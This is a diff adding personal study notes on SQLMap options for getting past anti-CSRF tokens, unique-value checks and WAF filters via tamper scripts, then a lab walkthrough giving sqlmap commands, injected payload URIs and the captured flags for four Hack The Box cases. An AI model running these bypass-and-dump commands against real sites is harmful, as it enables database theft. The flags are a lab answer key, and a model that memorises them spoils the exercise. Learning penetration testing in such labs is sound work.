@@ -1,1 +1,101 @@
 
+Anti-CSRF Token Bypass
+One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.
+
+Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is --csrf-token. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
+
+
+Additionally, even in a case where the user does not explicitly specify the token's name via --csrf-token, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests:
+
+EXAMPLE: [!bash!]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 22:18:01 /2020-09-18/
+
+POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
+
+
+Unique Value Bypass
+In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option --randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent:
+
+Example: [!bash!]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&rp=99954
+URI: http://www.example.com:80/?id=1&rp=87216
+URI: http://www.example.com:80/?id=9030&rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
+
+Tamper Scripts
+Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.
+
+For example, one of the most popular tamper scripts between is replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.
+
+Tamper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).
+
+Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:
+
+
+Tamper-Script	                                          Description
+0eunion	Replaces                                       instances of UNION with e0UNION
+base64encode	                                        Base64-encodes all characters in a given payload
+between	                                              Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
+commalesslimit	                                      Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
+equaltolike	                                            Replaces all occurrences of operator equal (=) with LIKE counterpart
+halfversionedmorekeywords	                            Adds (MySQL) versioned comment before each keyword
+modsecurityversioned	                                Embraces complete query with (MySQL) versioned comment
+modsecurityzeroversioned	                              Embraces complete query with (MySQL) zero-versioned comment
+percentage	                                          Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
+plus2concat	                                          Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
+randomcase	                                          Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
+space2comment	                                        Replaces space character ( ) with comments `/
+space2dash	                                          Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
+space2hash	                                          Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
+space2mssqlblank	                                    Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
+space2plus	                                          Replaces space character ( ) with plus (+)
+space2randomblank	                                    Replaces space character ( ) with a random blank character from a valid set of alternate characters
+symboliclogical	                                      Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
+versionedkeywords	                                    Encloses each non-function keyword with (MySQL) versioned comment
+versionedmorekeywords	                                Encloses each keyword with (MySQL) versioned comment
+
+
+
+
+
+CHALLENGE: 
+
+
+
+QUESTION 1 -  What's the contents of table flag8? (Case #8)
+1)
+2)Detect and exploit SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection
+(Note: non-standard token name is used)
+3) BEFORE hitting submit -> right click -> inspector -> netowrk -> request -> HIT SUBMIT -> get token -> wvY9oGxUE1NV0nTsJ3T4Y9cD4BxFSijK8klBl8ZA
+4) sqlmap -u 'http://94.237.53.146:35773/case8.php?' --data 'id=1&t0ken=wvY9oGxUE1NV0nTsJ3T4Y9cD4BxFSijK8klBl8ZA' --csrf-token=t0ken --batch --dump
+5) output: HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} 
+
+
+QUESTION 2 -  What's the contents of table flag9? (Case #9) -  HTB{700_much_r4nd0mn355_f0r_my_74573} 
+1)http://94.237.53.146:35773/case9.php
+2) hit get id -> we recieve a uid of - 1072490005
+3) sqlmap -u "http://94.237.53.146:35773/case9.php?id=1&uid=1072490005" --randomize=uid --batch --dump
+4) output:  HTB{700_much_r4nd0mn355_f0r_my_74573}
+
+QUESTION 3 -  What's the contents of table flag10? (Case #10) - HTB{y37_4n07h3r_r4nd0m1z3}
+1) http://94.237.53.146:35773/case10.php
+2) Detect and exploit SQLi vulnerability in POST parameter id
+3) sqlmap -u "http://94.237.53.146:35773/case10.php" --data="id=1" --random-agent --batch --dump
+4) output: HTB{y37_4n07h3r_r4nd0m1z3} 
+
+QUESTION 4 - What's the contents of table flag11? (Case #11) - HTB{5p3c14l_ch4r5_n0_m0r3} 
+1) http://94.237.53.146:35773/case11.php
+2) Detect and exploit SQLi vulnerability in GET parameter id
+3) sqlmap -u 'http://94.237.53.146:35773/case11.php?id=1' --tamper=between -T flag11 --batch --dump
+4) output: HTB{5p3c14l_ch4r5_n0_m0r3} 
